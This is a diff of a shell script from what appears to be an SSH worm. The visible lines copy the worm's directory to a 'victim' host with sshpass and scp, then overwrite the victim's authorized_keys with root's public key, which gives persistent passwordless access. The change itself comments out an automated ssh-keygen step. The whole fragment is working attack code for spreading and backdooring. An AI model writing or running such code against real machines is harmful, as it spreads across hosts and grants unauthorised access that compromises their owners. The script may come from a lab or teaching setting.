@@ -10,25 +10,26 @@ sshpass -e scp -r /home/victim/Desktop/ssh_worm victim@"$IP_Address":/home/victi
 # publickey
 SSH_PATH="/home/victim/.ssh"
 
-if ["$1" = "y"]
-then
-	(
-	echo "\r"
-	sleep 1
-	echo "\r"
-	sleep 1
-	echo "\r"
-	sleep 1
-	echo "\r"
-	)|ssh-keygen
-else 
-	(
-	echo "\r"
-	sleep 1
-	echo "n\r"
-	sleep 1
-	)|ssh-keygen
-fi
+echo "$1"
+
+#if ["$1" = "y"]
+#then
+#	(
+#	echo "\r"
+#	echo "\r"
+#	sleep 1
+#	echo "\r"
+#	sleep 1
+#	echo "\r"
+#	)|ssh-keygen
+#else 
+#	(
+#	echo "\r"
+#	sleep 1
+#	echo "n\r"
+#	sleep 1
+#	)|ssh-keygen
+#fi
 
 sshpass -e scp /root/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/
 sshpass -e scp /root/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/authorized_keys
